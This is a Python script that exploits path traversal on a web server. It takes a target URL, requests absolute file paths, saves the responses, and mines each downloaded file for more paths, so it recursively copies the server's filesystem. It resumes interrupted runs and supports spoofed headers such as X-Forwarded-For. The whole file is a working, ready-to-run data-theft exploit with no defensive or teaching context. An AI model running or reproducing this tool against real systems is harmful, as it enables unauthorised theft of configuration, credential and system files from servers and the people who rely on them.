import requests
from requests.exceptions import HTTPError
import re
import os.path
import argparse


class HttpClient:
    def __init__(self, arguments):
        self.base_url = arguments.url
        self.session = requests.Session()

        for header in arguments.headers:
            key, value = header.split(": ", 1)
            self.session.headers[key] = value

    def request_file(self, path):
        url = self.base_url + path
        response = self.session.get(url, allow_redirects=False)
        if response.status_code != 200:
            raise FileNotFoundError(path)
        return response.content


def write_file(dest, response):
    try:
        dest_dir = os.path.dirname(dest)
        os.makedirs(dest_dir)
    except FileExistsError:
        pass

    mode = "wb"
    if isinstance(response, str):
        mode = "w"

    with open(dest, mode) as fp:
        fp.write(response)


def read_file(path):
    try:
        with open(path, "r") as fp:
            return {l.strip() for l in fp.readlines()}
    except FileNotFoundError:
        return set()


def should_try_download(path):
    if path.startswith("/dev/"):
        return False

    if path.endswith("/"):
        return False

    return True


def find_files(content):
    matches = re.findall(b"/[a-z]+/[a-zA-Z0-9._/-]+", content)
    return {m.decode("ASCII") for m in matches if should_try_download(m.decode("ASCII"))}


class Spider:
    def __init__(self, client, args):
        self.client = client
        self.save_dir = args.save_dir
        self.done_file = os.path.join(self.save_dir, ".done.txt")
        self.queue_file = os.path.join(self.save_dir, ".queue.txt")

        self.done = read_file(self.done_file)
        self.queue = read_file(args.filelist) | read_file(self.queue_file)
        self.queue -= self.done

    def save_state(self):
        write_file(self.queue_file, "\n".join(self.queue))
        write_file(self.done_file, "\n".join(self.done))

    def spider(self):
        try:
            while self.queue:
                path = self.queue.pop()
                try:
                    print("  " + path, end="\r")
                    response = self.client.request_file(path)
                    if response:
                        write_file(self.save_dir + path, response)
                        print("\u2713 " + path)
                    else:
                        print("0 " + path)

                    files = find_files(response)
                    remain = files - self.done
                    self.queue |= remain
                except (HTTPError, FileNotFoundError) as e:
                    print("\u274c " + path)

                self.done.add(path)
        finally:
            self.save_state()

        print("Done")


def parse_arguments():
    parser = argparse.ArgumentParser(description="Exploit path traversal")
    parser.add_argument("-H", "--header", dest="headers", default=[], action="append", help="Extra header (e.g. \"X-Forwarded-For: 127.0.0.1\")")
    parser.add_argument("-o", "--output-dir", dest="save_dir", default="out", help="Save files to this directory")
    parser.add_argument("-f", "--filelist", dest="filelist", default="filelist.txt", help="File with a list of paths to download")
    parser.add_argument("url", help="URL to attack")
    return parser.parse_args()


def path_to_absolute(save_dir, path_in_save_dir):
    assert path_in_save_dir.startswith(save_dir)
    return path_in_save_dir[len(save_dir.rstrip('/')):]


if __name__ == "__main__":
    args = parse_arguments()
    client = HttpClient(args)
    spider = Spider(client, args)
    spider.spider()
